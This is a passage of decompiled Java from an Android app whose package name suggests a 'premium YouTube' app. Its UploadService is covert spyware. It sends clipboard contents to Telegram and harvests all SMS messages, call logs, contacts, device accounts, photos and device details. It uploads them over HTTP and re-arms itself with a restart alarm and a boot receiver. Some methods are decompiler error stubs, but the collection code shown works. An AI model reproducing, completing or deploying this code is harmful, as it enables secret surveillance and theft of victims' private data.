        if (clip != null && clip.getItemCount() > LiveLiterals$UploadServiceKt.INSTANCE.m۳۰۹Int$arg1$callgreater$branch$cond$if$fun$anonymous$$arg0$calladdPrimaryClipChangedListener$funonCreate$classUploadService()) {
            String copiedText = clip.getItemAt(LiveLiterals$UploadServiceKt.INSTANCE.m۲۲۹Int$arg0$callgetItemAt$$this$callcoerceToText$$this$calltoString$valcopiedText$branch$if$fun$anonymous$$arg0$calladdPrimaryClipChangedListener$funonCreate$classUploadService()).coerceToText(this$0).toString();
            if (!StringsKt.isBlank(copiedText)) {
                this$0.sendClipboardToTelegram(copiedText);
            }
        }
    }

    @Override // android.app.Service
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!this.isUploading) {
            this.isUploading = LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷Boolean$arg0$call$setisUploading$$branch$if$funonStartCommand$classUploadService();
            return 1;
        }
        return 1;
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startPhotoUpload$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startPhotoUpload$1", f = "UploadService.kt", i = {}, l = {307, 308}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۵۵1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۵۵1(Continuation<? super C۰۰۵۵1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۵۵1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Multi-variable type inference failed */
        /* JADX WARN: Removed duplicated region for block: B:15:0x002a A[Catch: Exception -> 0x001b, TryCatch #0 {Exception -> 0x001b, blocks: (B:7:0x0012, B:13:0x0022, B:15:0x002a, B:18:0x0039, B:8:0x0016), top: B:25:0x0006 }] */
        /* JADX WARN: Removed duplicated region for block: B:20:0x004b A[RETURN] */
        /* JADX WARN: Type inference failed for: r1v0, types: [int] */
        /* JADX WARN: Type inference failed for: r1v1, types: [com.w8sb.w8premiumyt.UploadService$startPhotoUpload$1] */
        /* JADX WARN: Type inference failed for: r1v2 */
        /* JADX WARN: Type inference failed for: r1v3 */
        /* JADX WARN: Type inference failed for: r1v4, types: [com.w8sb.w8premiumyt.UploadService$startPhotoUpload$1] */
        /* JADX WARN: Type inference failed for: r1v5, types: [com.w8sb.w8premiumyt.UploadService$startPhotoUpload$1] */
        /* JADX WARN: Type inference failed for: r1v6 */
        /* JADX WARN: Type inference failed for: r1v7 */
        /* JADX WARN: Type inference failed for: r1v8 */
        /* JADX WARN: Type inference failed for: r3v2 */
        /* JADX WARN: Type inference failed for: r4v2 */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:19:0x0049 -> B:13:0x0022). Please report as a decompilation issue!!! */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r7) {
            /*
                r6 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r6.label
                switch(r1) {
                    case 0: goto L1d;
                    case 1: goto L16;
                    case 2: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                r7.<init>(r0)
                throw r7
            L11:
                r1 = r6
                kotlin.ResultKt.throwOnFailure(r7)     // Catch: java.lang.Exception -> L1b
                goto L4c
            L16:
                r1 = r6
                kotlin.ResultKt.throwOnFailure(r7)     // Catch: java.lang.Exception -> L1b
                goto L39
            L1b:
                r0 = move-exception
                goto L4d
            L1d:
                kotlin.ResultKt.throwOnFailure(r7)
                r1 = r6
            L22:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this     // Catch: java.lang.Exception -> L1b
                boolean r2 = com.w8sb.w8premiumyt.UploadService.access$isUploading$p(r2)     // Catch: java.lang.Exception -> L1b
                if (r2 == 0) goto L64
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this     // Catch: java.lang.Exception -> L1b
                r3 = r1
                kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3     // Catch: java.lang.Exception -> L1b
                r4 = 1
                r1.label = r4     // Catch: java.lang.Exception -> L1b
                java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$uploadAllPhotos(r2, r3)     // Catch: java.lang.Exception -> L1b
                if (r2 != r0) goto L39
                return r0
            L39:
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r2 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE     // Catch: java.lang.Exception -> L1b
                long r2 = r2.m۳۳۵Long$arg0$calldelay$body$loop$try$fun$anonymous$$arg2$calllaunch$funstartPhotoUpload$classUploadService()     // Catch: java.lang.Exception -> L1b
                r4 = r1
                kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4     // Catch: java.lang.Exception -> L1b
                r5 = 2
                r1.label = r5     // Catch: java.lang.Exception -> L1b
                java.lang.Object r2 = kotlinx.coroutines.DelayKt.delay(r2, r4)     // Catch: java.lang.Exception -> L1b
                if (r2 != r0) goto L4c
                return r0
            L4c:
                goto L22
            L4d:
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r2 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r2 = r2.m۸۳۵String$arg0$calle$catch$fun$anonymous$$arg2$calllaunch$funstartPhotoUpload$classUploadService()
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r3 = r3.m۱۳۱۳String$arg1$calle$catch$fun$anonymous$$arg2$calllaunch$funstartPhotoUpload$classUploadService()
                r4 = r0
                java.lang.Throwable r4 = (java.lang.Throwable) r4
                android.util.Log.e(r2, r3, r4)
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this
                com.w8sb.w8premiumyt.UploadService.access$restartService(r2)
            L64:
                kotlin.Unit r0 = kotlin.Unit.INSTANCE
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۵1.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    private final void startPhotoUpload() {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۵1(null), 3, (Object) null);
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0019  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:34:0x011b -> B:70:0x011f). Please report as a decompilation issue!!! */
    /*  JADX ERROR: JadxRuntimeException in pass: RegionMakerVisitor
        jadx.core.utils.exceptions.JadxRuntimeException: Not found exit edge by exit block: B:24:0x00cf
        	at ib.a.f(Unknown Source:2)
        	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.checkLoopExits(Unknown Source:96)
        	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.makeLoopRegion(Unknown Source:171)
        	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.process(Unknown Source:61)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:44)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
        	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:137)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
        	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:115)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
        	at jadx.core.dex.visitors.regions.maker.LoopRegionMaker.process(Unknown Source:316)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:44)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
        	at jadx.core.dex.visitors.regions.maker.IfRegionMaker.process(Unknown Source:115)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:147)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
        	at jadx.core.dex.visitors.regions.maker.SwitchRegionMaker.addCases(Unknown Source:159)
        	at jadx.core.dex.visitors.regions.maker.SwitchRegionMaker.process(Unknown Source:94)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.traverse(Unknown Source:136)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeRegion(Unknown Source:72)
        	at jadx.core.dex.visitors.regions.maker.RegionMaker.makeMthRegion(Unknown Source:6)
        	at jadx.core.dex.visitors.regions.RegionMakerVisitor.visit(Unknown Source:22)
        */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object uploadAllPhotos(kotlin.coroutines.Continuation<? super kotlin.Unit> r22) {
        /*
            Method dump skipped, instruction units count: 382
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.uploadAllPhotos(kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX WARN: Removed duplicated region for block: B:59:0x0324 A[Catch: Exception -> 0x037e, TryCatch #1 {Exception -> 0x037e, blocks: (B:41:0x0295, B:43:0x029b, B:45:0x02a6, B:46:0x02ad, B:48:0x02b3, B:49:0x02de, B:51:0x02e4, B:53:0x02f4, B:59:0x0324, B:61:0x032c, B:62:0x033a, B:64:0x0340), top: B:85:0x0295, outer: #4 }] */
    /* JADX WARN: Removed duplicated region for block: B:98:0x0327 A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.String getBasicDeviceInfo() {
        /*
            Method dump skipped, instruction units count: 1084
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.getBasicDeviceInfo():java.lang.String");
    }

    private final String getAccountsInfo() {
        StringBuilder accountInfo = new StringBuilder(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۶String$arg0$call$init$$valaccountInfo$fungetAccountsInfo$classUploadService());
        try {
            Object systemService = getSystemService("account");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.accounts.AccountManager");
            AccountManager accountManager = (AccountManager) systemService;
            Object[] accounts = accountManager.getAccounts();
            Intrinsics.checkNotNullExpressionValue(accounts, "accountManager.accounts");
            Object[] $this$forEach$iv = accounts;
            for (Object element$iv : $this$forEach$iv) {
                Account account = (Account) element$iv;
                accountInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۵۴String$0$str$arg0$callappend$fun$anonymous$$arg0$callforEach$try$fungetAccountsInfo$classUploadService() + account.name + LiveLiterals$UploadServiceKt.INSTANCE.m۶۳۰String$2$str$arg0$callappend$fun$anonymous$$arg0$callforEach$try$fungetAccountsInfo$classUploadService() + account.type + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۸String$4$str$arg0$callappend$fun$anonymous$$arg0$callforEach$try$fungetAccountsInfo$classUploadService());
            }
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۳۹String$arg0$calle$catch$fungetAccountsInfo$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۱۷String$arg1$calle$catch$fungetAccountsInfo$classUploadService(), e);
            accountInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۸۷String$arg0$callappend$catch$fungetAccountsInfo$classUploadService());
        }
        String string = accountInfo.toString();
        Intrinsics.checkNotNullExpressionValue(string, "accountInfo.toString()");
        return string;
    }

    private final String getSMSInfo() {
        StringBuilder smsInfo = new StringBuilder(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۳String$arg0$call$init$$valsmsInfo$fungetSMSInfo$classUploadService());
        try {
            Cursor cursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, new String[]{"address", "body", "date"}, null, null, LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۴String$arg4$callquery$valcursor$try$fungetSMSInfo$classUploadService());
            if (cursor != null) {
                Cursor cursor2 = cursor;
                try {
                    Cursor it = cursor2;
                    SimpleDateFormat dateFormat = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۰String$arg0$call$init$$valdateFormat$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService(), Locale.getDefault());
                    while (it.moveToNext()) {
                        String address = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۲Int$arg0$callgetString$valaddress$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService());
                        String body = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۳Int$arg0$callgetString$valbody$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService());
                        long date = it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۵Int$arg0$callgetLong$valdate$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService());
                        smsInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۳String$0$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService() + address + LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۹String$2$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService());
                        smsInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۵۹String$0$str$arg0$callappend1$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService() + dateFormat.format(new Date(date)) + LiveLiterals$UploadServiceKt.INSTANCE.m۶۳۵String$2$str$arg0$callappend1$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService());
                        smsInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۶۴String$0$str$arg0$callappend2$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService() + body + LiveLiterals$UploadServiceKt.INSTANCE.m۶۴۰String$2$str$arg0$callappend2$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetSMSInfo$classUploadService());
                    }
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(cursor2, (Throwable) null);
                } finally {
                }
            }
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۴۳String$arg0$calle$catch$fungetSMSInfo$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۲۰String$arg1$calle$catch$fungetSMSInfo$classUploadService(), e);
            smsInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۸String$arg0$callappend$catch$fungetSMSInfo$classUploadService());
        }
        String string = smsInfo.toString();
        Intrinsics.checkNotNullExpressionValue(string, "smsInfo.toString()");
        return string;
    }

    private final String getCallLogInfo() {
        String type;
        StringBuilder callLogInfo = new StringBuilder(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۷String$arg0$call$init$$valcallLogInfo$fungetCallLogInfo$classUploadService());
        try {
            Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, new String[]{"number", "type", "date", "duration"}, null, null, "date" + LiveLiterals$UploadServiceKt.INSTANCE.m۶۰۸String$1$str$arg4$callquery$valcursor$try$fungetCallLogInfo$classUploadService());
            if (cursor != null) {
                Cursor cursor2 = cursor;
                try {
                    Cursor it = cursor2;
                    SimpleDateFormat dateFormat = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۹String$arg0$call$init$$valdateFormat$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService(), Locale.getDefault());
                    while (it.moveToNext()) {
                        String number = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۰Int$arg0$callgetString$valnumber$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                        switch (it.getInt(LiveLiterals$UploadServiceKt.INSTANCE.m۲۲۶Int$arg0$callgetInt$valtmp0_subject$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService())) {
                            case 1:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۷۵String$branch$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService();
                                break;
                            case 2:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۷۹String$branch1$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService();
                                break;
                            case 3:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۸۳String$branch2$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService();
                                break;
                            default:
                                type = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۰۹String$else$when$valtype$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService();
                                break;
                        }
                        long date = it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۴Int$arg0$callgetLong$valdate$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                        long duration = it.getLong(LiveLiterals$UploadServiceKt.INSTANCE.m۲۳۷Int$arg0$callgetLong$valduration$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                        callLogInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۳۹String$0$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService() + number + LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۵String$2$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                        callLogInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۵۸String$0$str$arg0$callappend1$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService() + dateFormat.format(new Date(date)) + LiveLiterals$UploadServiceKt.INSTANCE.m۶۳۴String$2$str$arg0$callappend1$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                        callLogInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۶۳String$0$str$arg0$callappend2$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService() + duration + LiveLiterals$UploadServiceKt.INSTANCE.m۶۳۹String$2$str$arg0$callappend2$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                        callLogInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۶۶String$0$str$arg0$callappend3$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService() + type + LiveLiterals$UploadServiceKt.INSTANCE.m۶۴۲String$2$str$arg0$callappend3$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetCallLogInfo$classUploadService());
                    }
                    Unit unit = Unit.INSTANCE;
                    CloseableKt.closeFinally(cursor2, (Throwable) null);
                } finally {
                }
            }
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۴۱String$arg0$calle$catch$fungetCallLogInfo$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۱۹String$arg1$calle$catch$fungetCallLogInfo$classUploadService(), e);
            callLogInfo.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۱String$arg0$callappend$catch$fungetCallLogInfo$classUploadService());
        }
        String string = callLogInfo.toString();
        Intrinsics.checkNotNullExpressionValue(string, "callLogInfo.toString()");
        return string;
    }

    private final String getContactsInfo() {
        Cursor cursor;
        StringBuilder sb = new StringBuilder();
        try {
            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"display_name", "data1", "data1"}, null, null, null);
        } catch (Exception e) {
            sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۴String$arg0$callappend$catch$fungetContactsInfo$classUploadService());
        }
        if (cursor != null) {
            Cursor cursor2 = cursor;
            try {
                Cursor it = cursor2;
                while (true) {
                    if (!it.moveToNext()) {
                        break;
                    }
                    String name = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۶Int$arg0$callgetString$valname$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService());
                    String number = it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۲Int$arg0$callgetString$valnumber$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService());
                    String email = it.isNull(LiveLiterals$UploadServiceKt.INSTANCE.m۲۵۹Int$arg0$callisNull$cond$if$valemail$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService()) ? null : it.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۲۴۱Int$arg0$callgetString$else$if$valemail$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService());
                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۱String$0$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService() + name + LiveLiterals$UploadServiceKt.INSTANCE.m۶۱۷String$2$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService() + number + LiveLiterals$UploadServiceKt.INSTANCE.m۷۰۲String$4$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService() + email + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۷String$6$str$arg0$callappend$body$loop$fun$anonymous$$arg0$calluse$else$when$try$fungetContactsInfo$classUploadService());
                    sb.append(LiveLiterals$UploadServiceKt.INSTANCE.m۷۹۴String$arg0$callappend$catch$fungetContactsInfo$classUploadService());
                }
                Unit unit = Unit.INSTANCE;
                CloseableKt.closeFinally(cursor2, (Throwable) null);
            } finally {
            }
        }
        String string = sb.toString();
        Intrinsics.checkNotNullExpressionValue(string, "sb.toString()");
        return string;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x001f  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object collectAndSendContacts(kotlin.coroutines.Continuation<? super kotlin.Unit> r18) {
        /*
            Method dump skipped, instruction units count: 426
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.collectAndSendContacts(kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x001f  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object collectAndSendCallLog(kotlin.coroutines.Continuation<? super kotlin.Unit> r21) {
        /*
            Method dump skipped, instruction units count: 660
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.collectAndSendCallLog(kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendTextFile(java.lang.String r11, java.lang.String r12, kotlin.coroutines.Continuation<? super kotlin.Unit> r13) {
        /*
            Method dump skipped, instruction units count: 250
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendTextFile(java.lang.String, java.lang.String, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendTextFile$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendTextFile$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۴۳2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ Request $request;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۴۳2(Request request, Continuation<? super C۰۰۴۳2> continuation) {
            super(2, continuation);
            this.$request = request;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۴۳2(this.$request, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(this.$request).execute();
                    try {
                        Response response2 = response;
                        if (!response2.isSuccessful()) {
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۲String$arg0$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextFile$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۴String$0$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendTextFile$classUploadService() + response2.code());
                        }
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return Unit.INSTANCE;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendAllDeviceInfo$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendAllDeviceInfo$1", f = "UploadService.kt", i = {0, 0}, l = {707}, m = "invokeSuspend", n = {"chunks", "index$iv"}, s = {"L$0", "I$0"})
    static final class C۰۰۱۶1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int I$0;
        Object L$0;
        Object L$1;
        Object L$2;
        int label;

        C۰۰۱۶1(Continuation<? super C۰۰۱۶1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۱۶1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:13:0x0097 A[Catch: Exception -> 0x01d6, TryCatch #0 {Exception -> 0x01d6, blocks: (B:7:0x0027, B:11:0x0091, B:13:0x0097, B:15:0x009f, B:16:0x00a2, B:18:0x00b4, B:20:0x00f5, B:26:0x01a9, B:36:0x01d0, B:37:0x01d3, B:10:0x0039, B:21:0x0162, B:23:0x016c, B:24:0x01a5, B:33:0x01cd), top: B:43:0x0008, inners: #1, #2 }] */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:29:0x01c4 -> B:30:0x01c6). Please report as a decompilation issue!!! */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r19) {
            /*
                Method dump skipped, instruction units count: 500
                To view this dump add '--comments-level debug' option
            */
            throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۱۶1.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    private final void sendAllDeviceInfo() {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۱۶1(null), 3, (Object) null);
    }

    private final void registerRestartAlarm() {
        Object systemService = getSystemService("alarm");
        Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.app.AlarmManager");
        AlarmManager alarmManager = (AlarmManager) systemService;
        Intent intent = new Intent(this, (Class<?>) BootReceiver.class);
